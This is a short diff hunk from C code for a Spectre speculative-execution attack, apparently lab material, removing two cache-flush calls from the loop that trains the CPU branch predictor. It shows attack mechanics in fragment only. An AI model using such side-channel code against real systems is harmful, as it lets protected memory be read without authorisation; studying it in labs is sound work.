@@ -56,8 +56,6 @@ void spectreAttack(size_t index_beyond)
   volatile int z;
   // Train the CPU to take the true branch inside restrictedAccess().
   for (i = 0; i < 10; i++) { 
-      _mm_clflush(&bound_upper);
-      _mm_clflush(&bound_lower);
       restrictedAccess(i); 
   }
   // Flush bound_upper, bound_lower, and array[] from the cache.
